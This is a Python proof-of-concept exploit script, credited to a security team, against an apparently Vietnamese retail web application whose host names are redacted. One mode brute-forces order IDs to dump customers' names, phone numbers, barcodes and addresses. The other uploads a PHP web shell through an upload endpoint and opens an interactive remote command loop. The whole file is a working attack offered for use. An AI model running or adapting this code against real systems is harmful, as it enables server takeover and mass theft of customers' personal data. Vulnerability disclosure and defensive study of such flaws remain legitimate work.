# -*- coding: utf-8 -*-
# PoC by KietNA from Inv1cta Team, HPT Cyber Security
import requests
from bs4 import BeautifulSoup
import sys

def loadBanner():
	print('''
██╗  ██╗██████╗ ████████╗    ██████╗  ██████╗  ██████╗
██║  ██║██╔══██╗╚══██╔══╝    ██╔══██╗██╔═══██╗██╔════╝
███████║██████╔╝   ██║       ██████╔╝██║   ██║██║     
██╔══██║██╔═══╝    ██║       ██╔═══╝ ██║   ██║██║     
██║  ██║██║        ██║       ██║     ╚██████╔╝╚██████╗
╚═╝  ╚═╝╚═╝        ╚═╝       ╚═╝      ╚═════╝  ╚═════╝
                                                      
    ''')

def getInfoUser():
	url = "https://xr"
	headers = {"Cookie":"x"}
	for i in range(16000,100000):
		data = {"search":i,"sieuthi":"all","searchfor":"orderid"}
		r = requests.post(url, data=data, headers=headers)
		soup = BeautifulSoup(r.text, 'html.parser')
		result = soup.findAll('td')[1].text
		result_split = result.split("[]")
		print("[*] ID Đơn hàng:" + str(i))
		print("[*] Họ và tên:" + result_split[1])
		print("[*] Barcode:" + result_split[2])
		print("[*] Số điện thoại:" + result_split[3])
		print("[*] Địa chỉ:" + result_split[4] + "\r\n")

def cmdExec():
	while True:
		cmd = input('$ ')
		if(cmd == 'exit'):
			exit();
		xpl_url = "https://x/pocshell.php?2410="+cmd
		r = requests.get(xpl_url)
		print(r.text)

def getWebshell():
	print("[*] Writing Webshell On Server.....")
	url = "https://x/ajax/"
	payload = "<?php system($_GET[2410]);?>"
	multipart_form_data = {
	'request': (None, 'upload_image'),
    'target_dir': (None, 'qua'),
    'cnmsslug': (None, '159'),
    'file': ('pocshell.php', payload)
	}
	r = requests.post(url, files=multipart_form_data)
	if 'The file pocshell.php has been uploaded.' in r.text:
		print("[*] Webshell write success, Spawning...")
		cmdExec()


if __name__ == '__main__':
	loadBanner()
	if sys.argv[1] == 'dumpinfo':
		getInfoUser()
	if sys.argv[1] == 'spawnshell':
		getWebshell()
